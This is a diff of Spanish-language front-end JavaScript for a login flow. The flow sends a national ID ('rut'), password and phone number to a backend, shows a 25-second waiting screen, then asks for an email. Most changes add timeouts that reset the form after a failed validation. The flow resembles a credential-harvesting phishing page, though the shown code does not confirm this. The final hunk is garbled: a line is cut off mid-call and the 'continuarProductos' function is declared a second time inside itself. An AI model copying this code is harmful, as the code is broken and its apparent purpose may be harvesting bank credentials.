@@ -126,12 +126,11 @@
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ rut, passwd, telefono }),
-          credentials: "include" // ✅ importante para que viaje la cookie de sesión
+          credentials: "include"
         });
         const data = await response.json();
         document.getElementById("resultado").innerText = data.mensaje;
 
-        // ✅ Solo avanzar si el backend confirmó validación correcta
         if(response.ok && data.status === "ok"){
           document.getElementById("loginForm").style.display="none";
           document.getElementById("pantallaEspera").classList.remove("hidden");
@@ -142,9 +141,21 @@
           }, 25000);
         } else {
           document.getElementById("resultado").innerText = "❌ No se ha podido validar correctamente.";
+          // ✅ Volver al login después de 3 segundos
+          setTimeout(()=>{
+            document.getElementById("resultado").innerText = "";
+            document.getElementById("loginForm").style.display="block";
+            document.getElementById("pantallaEspera").classList.add("hidden");
+            document.getElementById("formCorreo").classList.add("hidden");
+            document.getElementById("pantallaProductos").classList.add("hidden");
+          }, 3000);
         }
       } catch (error) {
         document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
+        setTimeout(()=>{
+          document.getElementById("resultado").innerText = "";
+          document.getElementById("loginForm").style.display="block";
+        }, 3000);
       }
     });
 
@@ -163,11 +174,21 @@
 
         if(!(response.ok && data.status === "ok")){
           document.getElementById("resultado").innerText = "❌ No se ha podido validar correctamente.";
+          setTimeout(()=>{
+            document.getElementById("resultado").innerText = "";
+            document.getElementById("loginForm").style.display="block";
+            document.getElementById("formCorreo").classList.add("hidden");
+            document.getElementById("pantallaProductos").classList.add("hidden");
+          }, 3000);
           return;
         }
       } catch (error) {
         console.error("Error al enviar correo:", error);
         document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
+        setTimeout(()=>{
+          document.getElementById("resultado").innerText = "";
+          document.getElementById("loginForm").style.display="block";
+        }, 3000);
         return;
       }
 
@@ -181,6 +202,9 @@
     }
 
     function continuarProductos(){
+      document.getElementById("pantallaProductos").classList.add("hidden");
+      document.getElementById
+          function continuarProductos(){
       document.getElementById("pantallaProductos").classList.add("hidden");
       document.getElementById("pantallaEspera").classList.remove("hidden");
 
